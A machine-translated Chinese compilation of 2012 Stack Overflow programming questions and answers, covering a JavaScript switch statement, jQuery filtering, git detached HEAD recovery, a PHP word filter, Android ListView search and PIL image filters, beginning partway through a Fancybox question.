默认情况下，在 Galleriffic 中，用户可以通过单击放大的主图像或选择缩略图来浏览画廊。缩略图工作没有问题。但是，当我单击主图像时，Fancybox div 消失了，并且出现了加载微调器，而不是在图库中显示下一个图像 - 我认为它属于 Fancybox。如果我然后单击微调器 div，它会关闭并返回原始网页。

最好的解决方案是从主图像中删除链接，只使用缩略图查看图库。我的各种尝试均未成功 - 图像消失或微调器继续加载。

在此阶段欢迎任何想法/建议！如果您需要查看任何代码来玩，请告诉我，我会发布。

提前谢谢了！

编辑：这是[一个精简版本的链接](http://learnline-dev.cdu.edu.au/erin/showcase/showcase.html)- 如果我在本地查看它，那么加载微调器就坐在那里，在线我在 Fancybox 中收到一个 URL 错误：“[object HTMLDivElement] was not found on this server”。

# javascript - 为什么这个 switch 语句的行为不像预期的那样？

> ID：11751417
> 
> 赞同：0
> 
> 时间：2012-08-01T01:31:52.670
> 
> 标签：javascript, switch-statement

我有以下开关块：

```
 var str = 'matches[pw1]';

    switch (str)
    {
        case (str.indexOf('matches') > -1) :
            console.log('yes');
        break;

       default:
           console.log(str.indexOf('matches') ) ;
           console.log('no');
        break;
    } 
```

我想要的是，如果`str`包含“匹配”这个词，那么它应该运行第一个 case 块，否则运行默认块。

但是，当我运行它时，我得到的输出是“0”，然后是“否”，这意味着默认块正在运行，尽管满足第一种情况的条件。

有什么想法有什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:35:46.603

您`case`可能正在测试是否`(str.indexOf('matches') > -1) == str`.

* * *

编辑：

准确理解什么`switch`和`case`意思可能很有价值。Javascript 的祖先之一，C，通常用于`switch`替换将原语与值列表（通常来自一个`enum`迭代或一系列文字）进行比较的代码块。所以而不是：

```
if (type == ENABLE_FRAMISTAN)
{
   enable_framistan();
}
else if (type == ENABLE_FROBSOSTICATOR)
{
   enable_frobnosticator();
}
else if (type == DISABLE_BAZTICULATOR)
{
   disable_bazticulator();
}
else
{
   assert(false);
} 
```

你可以改为写：

```
switch (type)
{
    case ENABLE_FRAMISTAN:      enable_framistan(); break;
    case ENABLE_FROBNOSTICATOR: enable_frobnosticator(); break;
    case DISABLE_BAZTICULATOR:  disable_bazticulator(); break;
    default: assert(false);  break;
} 
```

...这可能更容易消化（和/或发现错误）一大块代码，这些代码有效地`type`将值映射到被调用的函数（或类似的函数）。您指定的用法，检查一个字符串是否与许多潜在的（互斥的？）模式中的任何一个匹配，也不会映射到`switch`. 如果只是测试平等，它会很好地工作，但你的条件比`switch`设计表达的要复杂。您设法通过`switch`功能集保留的任何方式都[可能需要不太明显的代码](https://en.wikipedia.org/wiki/Principle_of_least_astonishment)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T01:36:54.860

为什么不使用 if 语句？尝试这样的事情：

```
 var str = 'matches[pw1]';

    if(str.indexOf('matches') > -1) {
        console.log('yes');
       break;
   }else{
       console.log(str.indexOf('matches') ) ;
       console.log('no');
       break;
  } 
```

它应该可以工作，因为无论如何你没有很多案例。我认为您无法在案例中进行比较。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T01:52:14.443

> 我想要的是，如果 str 包含单词“matches”，那么它应该运行第一个 case 块，否则运行默认块。

你不能用 switch 语句来做到这一点。switch 语句将评估 switch 表达式（在本例中`str`）的结果与 case 标签的值进行比较。案例标签可以是表达式（如您的示例中所示），但如果它们是表达式，则会对其进行评估，然后使用`===`. （这就是 ECMAScript 5.1 规范所说的......）

因此，您的代码实际上为这种情况做了什么（粗略地说）：

*   评估`(str.indexOf('matches') > -1)`哪个给你`true`或`false`
*   比较`true`或`false`与`str`... 的值失败并且不执行案例主体。

现在我*认为*你可以让你的方法如下工作：

```
case (str.indexOf('matches') > -1 ? str : '') :
        console.log('yes');
    break; 
```

但从代码可读性的角度（IMO）来看，这很**糟糕。**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T01:46:36.177

你应该知道switch的基本用法。我认为您错误地使用了 Switch。尝试如下使用它：

```
var str = 'matches[pw1]';
str = str.indexOf('matches');
switch (str)
    {
        case  -1 :
            console.log('yes');
        break;

       default:
           console.log(str.indexOf('matches') ) ;
           console.log('no');
        break;
    } 
```

请看以下网址[http://www.w3schools.com/js/js_switch.asp](http://www.w3schools.com/js/js_switch.asp)

如果以上不适合您的逻辑，请使用 if.. else if ... [http://www.w3schools.com/js/js_if_else.asp](http://www.w3schools.com/js/js_if_else.asp)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-01T01:38:17.340

你可以这样做：

```
console.log( str.indexOf( 'matches' ) > -1 ? 'yes' : 'no' ); 
```

# html - 为什么这个 JQuery 不转换？

> ID：11751424
> 
> 赞同：0
> 
> 时间：2012-08-01T01:32:37.777
> 
> 标签：html, css, jquery-ui, jquery

[http://jsfiddle.net/kCMvt/](http://jsfiddle.net/kCMvt/)

嘿大家。我为手机制作了这个 jQuery 页面，但是转换无法正常工作，我认为我已经正确完成了所有操作。我几乎查看了另一个示例中的代码并使用了相同的代码，但不确定它为什么不转换。有很多 CSS 因为我是从 jQuery 主题滚轮上得到的，所以这就是它有点过分的原因。我还不是一个 jQuery 专家，足以（还）做我自己的事情，但我无法想象它实际上有这么复杂的想法。

此 HTML 不会转换：

```
<!DOCTYPE html>

<html>

    <head>

        <meta charset="utf-8">

        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>jQuery Mobile: Theme Download</title>

        <link rel="stylesheet" href="themes/test1.min.css" />

        <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.1/jquery.mobile.structure-1.1.1.min.css" />

        <script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>

        <script src="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.js"></script>

    </head>

    <body>

        <div data-role="page" data-theme="a">

            <div data-role="header" data-position="inline">

            <div>

                <h1 style="font-size:16px;text-align:center;">Random Question</h1>

                </div>

            </div>

            <fieldset data-role="controlgroup">

                <input type="radio" name="radiochoice" id="radio-choice-1" value="choice-1" checked="checked" />

                <a href="#page2"><label for="radio-choice-1">Yes</label></a>

                <input type="radio" name="radio-choice" id="radio-choice-2" value="choice-2" />

                <a href="#page2"><label for="radio-choice-2">No</label></a>

            </fieldset>

            <div data-role="content" data-theme="a">

                <p style="text-align:center;font-weight:bold;color:#003366;">blablablab bla</p>

            </div><!-- end content -->

          <div data-role="footer">

          <h4>cool footer</h4> 

        </div><!-- end page -->

 <!-- start of 2nd page -->

 <div data-role="page" id="page2">

 <div data-role="header">

     <h1>Thanks For Your Opinion!</h1>

 </div><!-- end header -->

 <div data-role="content">

     <p>Page Content</p>

 </div>

 <div data-role="footer">

     <h4>Copyright</h4>

    </div><!-- end footer -->

 </div><!-- end page -->   

    </body>

</html>​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:28:46.247

对于初学者，您缺少第一个页脚（或页面）的结束标记：

```
 <div data-role="footer">
      <h4>cool footer</h4>
    </div>
  </div><!-- end page --> 
```

然后，您可以将整个输入（而不仅仅是标签）包装在一个链接中：

```
 <a href="#page2">
        <input type="radio" name="radiochoice" id="radio-choice-1" value="choice-1" checked="checked" /> 
        <label for="radio-choice-1">Yes</label>
    </a>
    <a href="#page2">
        <input type="radio" name="radio-choice" id="radio-choice-2" value="choice-2" />
        <label for="radio-choice-2">No</label>
    </a> 
```

[这是一个工作的jsFiddle](http://jsfiddle.net/kCMvt/6/)

此外，您应该考虑发布格式更佳的代码。适当的缩进会使丢失的标签更容易被发现，而且当你的代码格式化时，你会让那些试图阅读你的代码的人更加困难。

# php - 如何在php中对字符串执行preg_replace？

> ID：11751425
> 
> 赞同：0
> 
> 时间：2012-08-01T01:32:37.180
> 
> 标签：php, regex, replace, preg-replace, preg-match

我有一些简单的代码可以进行预匹配：

```
$bad_words = array('dic', 'tit', 'fuc',); //for this example i replaced the bad words

for($i = 0; $i < sizeof($bad_words); $i++)
{
    if(preg_match("/$bad_words[$i]/", $str, $matches))
    {
        $rep = str_pad('', strlen($bad_words[$i]), '*');
        $str = str_replace($bad_words[$i], $rep, $str);
    }
}
echo $str; 
```

所以，如果`$str`是`"dic"`结果将是' *** '等等。

现在有一个小问题 if `$str == f.u.c`。解决方案可能是使用：

```
$pattern = '~f(.*)u(.*)c(.*)~i';
$replacement = '***';
$foo =  preg_replace($pattern, $replacement, $str); 
```

在这种情况下，无论如何我都会得到`***`。我的问题是将所有这些代码放在一起。

我试过了：

```
$pattern = '~f(.*)u(.*)c(.*)~i';
$replacement = 'fuc';
$fuc =  preg_replace($pattern, $replacement, $str);

$bad_words = array('dic', 'tit', $fuc,); 

for($i = 0; $i < sizeof($bad_words); $i++)
{
    if(preg_match("/$bad_words[$i]/", $str, $matches))
    {
        $rep = str_pad('', strlen($bad_words[$i]), '*');
            $str = str_replace($bad_words[$i], $rep, $str);
    }
}
echo $str; 
```

这个想法是，然后我将它放在数组`$fuc`中`fuc`，然后数组完成它的工作，但这似乎不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:38:59.147

首先，您可以使用一个（动态生成的）正则表达式来完成**所有**坏词替换，如下所示：

```
$bad_words = array('dic', 'tit', 'fuc',);

$str = preg_replace_callback("/\b(?:" . implode( '|', $bad_words) . ")\b/", 
    function( $match) {
        return str_repeat( '*', strlen( $match[0])); 
}, $str); 
```

现在，您遇到了人们在单词之间添加句点的问题，您可以使用另一个正则表达式搜索并替换它们。但是，您必须记住`.`匹配正则表达式中的任何字符，并且必须进行转义（使用[`preg_quote()`](http://php.net/preg_quote)反斜杠或反斜杠）。

```
$bad_words = array_map( function( $el) { 
    return implode( '\.', str_split( $el));
}, $bad_words); 
```

这将创建一个`$bad_words`类似于以下内容的数组：

```
array(
    'd\.i\.c',
    't\.i\.t',
    'f\.u\.c'
) 
```

现在，您可以`$bad_words`像上面一样使用这个新数组来替换这些混淆的数组。

提示：你可以让这个`array_map()`调用“更好”，因为它可以更聪明地捕捉更多的混淆。例如，如果你想捕捉一个用句点、空格字符或逗号分隔的坏词，你可以这样做：

```
$bad_words = array_map( function( $el) { 
    return implode( '(?:\.|\s|,)', str_split( $el));
}, $bad_words); 
```

现在，如果您将该混淆组设为可选，您会发现更多的坏词：

```
$bad_words = array_map( function( $el) { 
    return implode( '(?:\.|\s|,)?', str_split( $el));
}, $bad_words); 
```

现在，坏词应该匹配：

```
f.u.c
f,u.c
f u c 
fu c
f.uc 
```

还有很多。

# objective-c - 项目为模拟器编译，但在为设备编译时出现 40 个错误

> ID：11751440
> 
> 赞同：0
> 
> 时间：2012-08-01T01:34:26.247
> 
> 标签：objective-c, ios, cocos2d-iphone, xcode4.3

昨天我遇到了一个大问题——突然我的 cocos2d 项目停止编译。你可以在这里阅读这个故事：[我的 cocos2d 项目停止编译！超过40个错误！该怎么办？](https://stackoverflow.com/questions/11746087/my-cocos2d-project-stopped-compiling-over-40-errors-what-to-do)

显然有些东西改变了文件夹名称，这就是原因。我做了一个新项目，将我的文件复制到其中，验证一切正常，制作快照和 zip 备份，然后进入睡眠状态。现在，当我对代码做了一些小改动并为模拟器编译它时，它就可以工作了。但是当我尝试为设备编译它时，我得到了同样的 40 个错误。这真是要了我的命。

我使用支持 ARC 的 cocos2d 项目。如果您想自己检查一下，这里是项目 - [https://www.dropbox.com/s/eic1llpri6x6akt/BusterballBackupV1.0.zip](https://www.dropbox.com/s/eic1llpri6x6akt/BusterballBackupV1.0.zip)

恢复快照或从 zip 文件也无济于事。

我认为问题可能在于：当您查看 Xcode 左侧的窗格时，您会看到项目布局，其中有一个名为 Products 的文件夹。它包含两个项目 - app 本身和 libcocos2d-library.a。当我检查新模板时，它们是黑色的，并且在 xcode 的深处有一些奇怪的路径。但是在我添加文件后，它们会变红并丢失路径。对此可以做些什么？我找不到那个文件 (libcocos2d-library.a)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T05:14:05.267

该问题是由静态库目标的配置引起的。选项“**始终搜索用户路径**”应设置为 NO。以下是步骤：

1.  选择目标 cocos2d-library
2.  在右侧，选择构建设置，
3.  查找**始终搜索用户路径**并将其设置为**否**

构建项目。应该没问题。我使用的 xCode 版本是 4.4 版（4F250）

# jquery - jquery - 具有多个类别的多选过滤器

> ID：11751448
> 
> 赞同：2
> 
> 时间：2012-08-01T01:35:37.167
> 
> 标签：jquery, list, filter

我有三类控件，每类都有几个选项：

```
 <ul class="series-selector-items">
        <li id="filter-type-A">A</li>
        <li id="filter-type-B">B</li>
        <li id="filter-type-C">C</li>
    </ul>
    <ul class="series-selector-items">
        <li id="filter-type-E">E</li>
        <li id="filter-type-F">F</li>
        <li id="filter-type-G">G</li>
    </ul>
    <ul class="series-selector-items">
       <li id="filter-type-H">H</li>
       <li id="filter-type-I">I</li>
       <li id="filter-type-J">J</li>
       <li id="filter-type-K">K</li>
    </ul> 
```

然后我有一个列表，其中包含来自上述控件的属性组合的项目：

```
 <ul>
     <li class="A E H">Item AEH</li>
     <li class="A F I">Item AFI</li>
     <li class="A G J">Item AGJ</li>
     <li class="A G H">Item AGH</li>
     <li class="B E H">Item BEH</li>
     <li class="B F H">Item BFH</li>
     <li class="B F H">Item BFH</li>
     <li class="C E I">Item CEI</li>
     <li class="C G K">Item CEI</li>
etc etc...
    </ul> 
```

我正在尝试找到一种基于所选控制选项组合过滤结果的方法。我需要能够选择控制选项的任意组合（例如 AEH）并显示所有具有正确属性的项目（项目 AEH）。

每个类别 (ABEK) 中应该有多个选项可供选择，并且类别应该协同工作以显示具有正确元素组合的选项。如果从同一类别中选择了多个选项，它们的结果仍应显示。我已将控制列表设为 li，但它们也可以是复选框。

使用 jQuery 执行此操作的最佳方法是什么？

编辑：这是我迄今为止尝试过的一种方法，将选定的选项添加到数组中：

```
var seriesSelected = [];    
$('ul.series-selector-items').click(function(){

            //Select the series clicked and give it the "selected" class
            $(this).toggleClass("selected");

            //Once selected, add the series to the seriesSelected array
            if ($(this).hasClass('selected')) {
               seriesSelected.push($(this).attr('id'));
            }
            //If de-selecting (by toggling off the "selected class"), then remove from the seriesSelected array
            else {
                seriesToRemove = $(this).attr('id');
                seriesSelected = $.grep(seriesSelected, function(value) {
                return seriesToRemove != value;
               });
            }
        }); 
```

不知道从那里去哪里...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T13:11:52.373

在这里，我用可理解的脚本在几个步骤中完成了上述查询的完整垃圾箱。您可以找到如下演示链接：

**演示：** [http ://codebins.com/bin/4ldqp90](http://codebins.com/bin/4ldqp90)

**HTML：**

```
<!-- Select Category Combinators -->
<ul class="series-selector-items">
  <li id="filter-type-A">
    A
  </li>
  <li id="filter-type-B">
    B
  </li>
  <li id="filter-type-C">
    C
  </li>
</ul>
<ul class="series-selector-items">
  <li id="filter-type-E">
    E
  </li>
  <li id="filter-type-F">
    F
  </li>
  <li id="filter-type-G">
    G
  </li>
</ul>
<ul class="series-selector-items">
  <li id="filter-type-H">
    H
  </li>
  <li id="filter-type-I">
    I
  </li>
  <li id="filter-type-J">
    J
  </li>
  <li id="filter-type-K">
    K
  </li>
</ul>
<!-- Search Item from Follwing List based on selected category combinator-->
<ul class="list">
  <li class="A B H">
    Item ABH
  </li>
  <li class="A E H">
    Item AEH
  </li>
  <li class="A F I">
    Item AFI
  </li>
  <li class="A G J">
    Item AGJ
  </li>
  <li class="A G H">
    Item AGH
  </li>
  <li class="B C I">
    Item BCI
  </li>
  <li class="B E H">
    Item BEH
  </li>
  <li class="B F H">
    Item BFH
  </li>
  <li class="C B K">
    Item CBK
  </li>
  <li class="C E I">
    Item CEI
  </li>
  <li class="C G K">
    Item CGK
  </li>
</ul> 
```

**CSS：**

```
.series-selector-items{
  display:inline-block;
  list-style:none;
  border:1px solid #3355f9;
  margin:0px;
  padding:0px;
  vertical-align:top;
  background:#fba5a2;
}
.series-selector-items li{
  padding:5px;
}
.series-selector-items li.selected{
  background:#f855f9;
}
.list{
  display:inline-block;
  list-style:none;
  border:1px solid #3355f9;
  margin:0px;
  padding:0px;
  vertical-align:top;
  background:#abd5f9;

}
.list li.searched{
  background: #3344ad;
  color:#dfdbab;
}
.list li{
  padding:3px;
} 
```

**jQuery：**

```
$(function() {

     $(".series-selector-items li").click(function() {

            //Set Default UnSearched List
            $(".list li").removeClass("searched");

            var seriesSelected = new Array();
            //Select the series clicked and give it the "selected" class
            $(this).toggleClass("selected");

            //Get All selected combinators 
            $("li.selected").each(function() {
                seriesSelected.push($.trim($(this).attr('id')).replace('filter-type-', ''));

            });

            //Combinator Exists Then...
            if (seriesSelected.length == 3) {

                //Generate Class Name Combination
                var ClassNames = "." + seriesSelected[0] + "." + seriesSelected[1] + "." + seriesSelected[2];

                //Search Item based on Combinator
                if ($(".list li" + ClassNames).length > 0) {
                    //if Found then add Searched Class on Item
                    $(".list li" + ClassNames).addClass("searched");
                }

            } else {
                $(".list li").removeClass("searched");
            }

    });

}); 
```

**演示：** [http ://codebins.com/bin/4ldqp90](http://codebins.com/bin/4ldqp90)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:00:45.490

[**使用更好的过滤更新**](http://jsfiddle.net/XPUrt/8/)

```
function filterItems() {
    var classSelectors = $(".selected").map(function() {
        var cls = this.id.split('-');
        return '.' + cls.splice(2).join('-');
    }).toArray().join('');

    if (classSelectors) {
        $('#items > li').filter(classSelectors).show('slow');
        $('#items > li').not(classSelectors).hide('slow');
    }
    else {
        //if no filter, show all
        $('#items > li').show('slow');
    }
}​ 
```

* * *

[**更新的演示**](http://jsfiddle.net/XPUrt/7/)

```
$(document).ready(function() {
    $(".series-selector-items > li").click(function() {
        $(this).toggleClass('selected');
        filterItems();
    });
});

function filterItems() {
    var classSelectors = $(".selected").map(function() {
        var cls = this.id.split('-');
        return '.'+cls.splice(2).join('-');
    }).toArray();

    //if no filter, show all
    if(!classSelectors.length){
        $('#items > li').show('slow');
    }

    $('#items > li').filter(classSelectors.join('')).show('slow');

    $('#items > li').not(function() {
        var self = this;
        var showThis = true;
        $.each(classSelectors, function(i,value) {
            if(!$(self).is(value)) {
                showThis = false;
            }
        });
        return showThis;
    }).hide('slow');
}
​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T02:02:35.183

也许是这样的：

```
$('li').not($("#sec li")).on('click', function() {
    if ($('.active').length < 3) {
        $(this).toggleClass('active');
        var letters=[];
        $('.active').each(function(i,e) {
            letters.push(e.id.replace('filter-type-',''));
        });
        if ($('.active').length == 3) {
            var elms = $('#sec li').filter(function() {
                if ($(this).is('.'+letters[0])&&$(this).is('.'+letters[1])&&$(this).is('.'+letters[2])) {
                    return this;
                }
            }).show();
            $('#sec li').not(elms).hide();
        }else{
            $('#sec li').hide();                               
        }
    }else{
        if ($(this).is('.active')) $(this).removeClass('active');
    }
});​ 
```

[**小提琴**](http://jsfiddle.net/Hy8Cd/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T02:13:46.900

这是我的解决方案：http: [//jsfiddle.net/NukGM/2/](http://jsfiddle.net/NukGM/2/)希望你喜欢！

单击字母，选定的字母（红色）将选定的 ID 累积在一个数组中。每次选择后，都会调用一个单独的方法，该方法会突出显示所选 ID 数组中存在的类的任何结果。

# git - 我很生气“目前不在分支上”

> ID：11751453
> 
> 赞同：2
> 
> 时间：2012-08-01T01:36:10.303
> 
> 标签：git

好吧，不知何故，我离开了我的主要分支。

这是我所做的`git reflog`：

```
00b0dbf HEAD@{5}: commit: Beginning to update and create functions from static analysis files
654d826 HEAD@{6}: checkout: moving from master to remotes/origin/master
654d826 HEAD@{7}: commit: Deleting old files
fac781a HEAD@{8}: commit: updating gitignore, removing old files
b8b4ef6 HEAD@{9}: commit: updating gitignore
c1c24f7 HEAD@{10}: commit: removing old files
8d1d5cb HEAD@{11}: commit: Changed base.r to represent new file structure
7d3f2d0 HEAD@{12}: commit (initial): First commit 
```

“不知何故”我离开了主人。

所以现在，当我尝试提交更改时，我得到：“当前不在分支上”。

我想做的是从提交 654d826 HEAD@{7} 重新加载，因为那真的是我最后一次更改任何重要的东西。

如何从提交 654d826 HEAD@{7} 回到“master”并变基

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T03:08:49.703

您只需签出一个远程跟踪分支。这些不会跟踪您的提交，因此正如它所说，您将处于分离的头部状态。您想使用您所做的最后一次提交更新主分支：

```
git push . HEAD:master 
```

然后返回 master 以便跟踪后续提交：

```
git checkout master 
```

如果第一次推送不起作用，这意味着您在 master 上做了其他提交。在这种情况下，请在您所在的位置创建一个临时分支：

```
git branch temp 
```

然后去你的主分支

```
git checkout master 
```

然后合并你在分离状态时所做的事情：

```
git merge temp 
```

您现在应该能够继续在 master 中提交和跟踪您的工作。

# android - Listview 搜索未返回正确的相应活动（TextWatcher）

> ID：11751458
> 
> 赞同：0
> 
> 时间：2012-08-01T01:36:25.650
> 
> 标签：android, listview, search, filter, textwatcher

我有一个列表视图，其中包含在我单击每个项目时开始的相应活动。它工作正常。但是当我搜索“Pedro”并单击它时，不要启动正确的活动。它打开了第一个活动“Joao.class”

这是我的代码。拜托，我需要一个详细的解释。我不太了解Java，所以有人可以向我解释或告诉我应该在哪里更改代码？

非常感谢！！！

```
public class Main extends Activity {

   private ListView lv1;
private EditText ed;
private String lv_arr[]=  {"Android","Cupcake","Donut","Eclairs","AndroidPeople","Froyo",};
private ArrayList<String> arr_sort= new ArrayList<String>();
int textlength=0;
@Override
public void onCreate(Bundle icicle)
{
super.onCreate(icicle);
setContentView(R.layout.main);
lv1=(ListView)findViewById(R.id.ListView01);
ed=(EditText)findViewById(R.id.EditText01);
lv1.setOnItemClickListener(new OnItemClickListener(){

public void onItemClick(AdapterView<?> arg0, View arg1, int position,
long arg3) {

       if ("João".equals(lv_arr[position])) {
           Intent myIntent = new Intent(Main.this, Joao.class);
           startActivity(myIntent);
       }

       if ("Maria".equals(lv_arr[position])) {
           Intent myIntent = new Intent(Main.this, Maria.class);
           startActivity(myIntent);
       }

       if ("Pedro".equals(lv_arr[position])) {
           Intent myIntent = new Intent(Main.this, Pedro.class);
           startActivity(myIntent);
       }

}

        });

// By using setAdpater method in listview we an add string array in list.
lv1.setAdapter(new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1 ,    lv_arr));
ed.addTextChangedListener(new TextWatcher() {

public void afterTextChanged(Editable s) {
}

public void beforeTextChanged(CharSequence s, int start, int count,
int after) {
}

public void onTextChanged(CharSequence s, int start, int before,
int count) {

textlength=ed.getText().length();
arr_sort.clear();
for(int i=0;i<lv_arr.length;i++)
{
if(textlength<=lv_arr[i].length())
{
if(ed.getText().toString().equalsIgnoreCase((String) lv_arr[i].subSequence(0,    textlength)))
{
arr_sort.add(lv_arr[i]);
}
}
}

lv1.setAdapter(new ArrayAdapter<String>(Main.this,android.R.layout.simple_list_item_1  , arr_sort));

}
});
}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:59:47.520

我的猜测是 android.R.layout.simple_list_item_1 中的数据在排序后与数组中的数据不匹配。与其查看数组，不如从 arr_sort 中获取值。IE：

`if ("Pedro".equals(arr_sort.get(position))) {`

# php - 通知 Ajax/Javascript 后台 PHP 已完成

> ID：11751459
> 
> 赞同：2
> 
> 时间：2012-08-01T01:36:40.313
> 
> 标签：php, javascript, jquery, ajax

好的，情况就是这样 - 简单明了：

*   **在页面 A 上：**我们执行一个 ajax 请求（比如说 to `intermediate.php`），它启动了一个后台进程 - 比如说`back.php`
*   `interm.php`返回
*   `back.php`继续工作直到完成，同时在数据库中更新其进度。

那么，页面 A 怎么会收到`back.php`已完成的通知呢？

*（我曾想过例如每 1-2 秒向脚本发出一个 ajax 请求来检查 db`back.php`的进度，但这看起来很奇怪，而且绝对没有效率......）*

有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-01T01:45:25.533

您可以使用很常见且不那么奇怪的长轮询或短轮询技术。它确实提出了很多不必要的请求，但它是最简单和最受支持的方法。

第二种方法是使用网络套接字。现在通常不支持通过 html5 的 Web 套接字，但是如果您的浏览器/设备不支持以前的方法。一个非常好的实时通信库是 Socket.IO。它允许实时或接近实时的许多不同实现，它还允许您选择要使用的通信方法。一些基于云的 Web 服务（例如 Paas）并未广泛支持 Web 套接字。图书馆将通过让您选择或强制使用特定的通信方法来解决此问题：Web Sockets、Flash Sockets、Long-Polling 等。

但由于你使用 php，你可以试试这个：[https ://github.com/lemmingzshadow/php-websocket](https://github.com/lemmingzshadow/php-websocket)

*   [http://www.htmlgoodies.com/html5/other/create-a-bi-directional-connection-to-a-php-server-using-html5-websockets.html#fbid=8Pw-Juo8eHG](http://www.htmlgoodies.com/html5/other/create-a-bi-directional-connection-to-a-php-server-using-html5-websockets.html#fbid=8Pw-Juo8eHG)
*   [略有不同的做法](http://forums.phpfreaks.com/index.php?topic=356022.0)
*   [http://www.gamedev.net/topic/613642-socketio-php-mysql/](http://www.gamedev.net/topic/613642-socketio-php-mysql/)
*   [http://devzone.zend.com/209/writing-socket-servers-in-php/](http://devzone.zend.com/209/writing-socket-servers-in-php/)
*   [socket.io + php + 在这个时间点这是一个现实的解决方案吗](https://stackoverflow.com/questions/10770787/socket-io-php-is-this-a-realistic-solution-at-this-point-in-time)

尽管正如在其中一些网站上所提到的，将 websockets 与 php 一起使用并不像 node.js 或 twisted python 那样直接。但尽管如此，它是可以实现的，并且在某种程度上确实有效。我发现拥有一个 node.js 后端来做实时工作比试图强制使用一种不应该以这种方式工作的技术要容易得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:47:50.167

您基本上要寻找的是彗星。这是一个很好的线程：

[在 PHP 中使用彗星？](https://stackoverflow.com/questions/603201/using-comet-with-php)

# windows - Windows/Mac 文件 io 字节为字节 POSIX 兼容？

> ID：11751460
> 
> 赞同：0
> 
> 时间：2012-08-01T01:36:48.940
> 
> 标签：windows, macos, filesystems, posix, endianness

我想使用 POSIX 编写一个跨平台文件 IO 实用程序。我想知道我在 Windows 上编写的文件是否可以移动到 OS X（通过电子邮件或拇指驱动器）并且看起来仍然包含完全相同的内容？如果我将文件从 OS X 移动到 Windows 会怎样？

此外，在将字符串写入此文件时，我应该注意这两个平台上是否有任何奇怪的 UTF-8 异常？

这个问题只针对较新的 Mac，而不是 PowerPC Mac。我只是想确保所有的字节顺序和相关的字节排序问题都在 PowerPC 中消失了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T07:14:53.040

如果您的 POSIX 代码在打开文件进行写入时使用“二进制”标志，并且两台机器具有相同的字节顺序（现代基于英特尔的 Mac 和基于英特尔的 Windows PC 都是如此），那么是的，文件应该是字节-字节相同。

至于 UTF-8，主要需要注意的是，一般来说，Windows 更喜欢预先组合的字符（“规范化形式的 NFC”），而 Mac OS 更喜欢分解的字符（“规范化形式的 NFD”）。也就是说，Windows 将“é”编码为 U+00E9 带尖音的拉丁小写字母 E，而 Mac OS 将其编码为 U+0065 拉丁小写字母 E，后跟 U+0301 COMBINING ACUTE ACCENT。显然，两个操作系统都会以相同的方式呈现两个序列，但我相信这会影响用户输入的字符，或从磁盘上的文件名读取。

至于与 PowerPC 相关的字节序相关问题，严格来说并非如此。ARM 至少可以在任一端模式下运行，例如，iOS 倾向于使用 little-endian（与 Intel 相匹配），其他操作系统可能以 big-endian 模式运行，并且一些（例如 Linux）可以以任何一种方式编译。维基百科没有提到 Android 设备通常使用哪种字节序。

# php - 如何用变量替换

> ID：11751462
> 
> 赞同：1
> 
> 时间：2012-08-01T01:36:56.163
> 
> 标签：php, replace

我有一个变量`$email`需要替换`<!--email-->`我的脚本中的所有变量。

有人可以指导我最好的方法吗，目前我正在做：

```
$email = $_SESSION["email"];
str_replace("<!--email-->",$email,"<!--email-->") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:42:43.167

```
$email = $_SESSION["email"];
$filename = 'script.php';
$script = str_replace("<!--email-->",$email,file_get_contents($filename)); 
```

它将更改您文件中的所有内容，您只需保存或回显它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:25:25.297

这是一个 4 班轮，它基本上会抓住你的所有`<!--tag-->`并用适当命名的变量替换它们：

```
$string = "string or output from file_get_contents()";

preg_match_all("/<!--([A-z0-9_]+)-->/", $string, $matches);

foreach($matches[1] as $match){
$string = preg_replace("/<!--([$match]+)-->/i", ${$match}, $string);
}

echo $string; 
```

# python - ImageOps.unsharp_mask 不适用于 PIL

> ID：11751463
> 
> 赞同：1
> 
> 时间：2012-08-01T01:37:16.527
> 
> 标签：python, image-processing, python-imaging-library, imagefilter

我编写了一个 Python 应用程序，我需要在其中执行一些图像任务。

我正在尝试 PIL，它是 ImageOps 模块。但看起来 unsharp_mask 方法不能正常工作。它应该返回另一个图像，但返回一个 ImagingCore 对象，我不知道它是什么。

这是一些代码：

```
import Image
import ImageOps

file = '/home/phius/test.jpg'
img = Image.open(file)
img = ImageOps.unsharp_mask(img)
#This fails with AttributeError: save
img.save(file) 
```

我坚持这一点。

我需要什么：能够做一些像 PIL 那样的图像 tweeks`autocontrast`以及`unsharp_mask`在控制质量水平的 jpg 中重新调整大小、旋转和导出的能力。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T03:59:06.227

您想要的是图像上的过滤器命令和 PIL ImageFilter 模块[1]，因此：

```
import Image
import ImageFilter

file = '/home/phius/test.jpg'
img = Image.open(file)
img2 = img.filter(ImageFilter.UnsharpMask) # note it returns a new image
img2.save(file) 
```

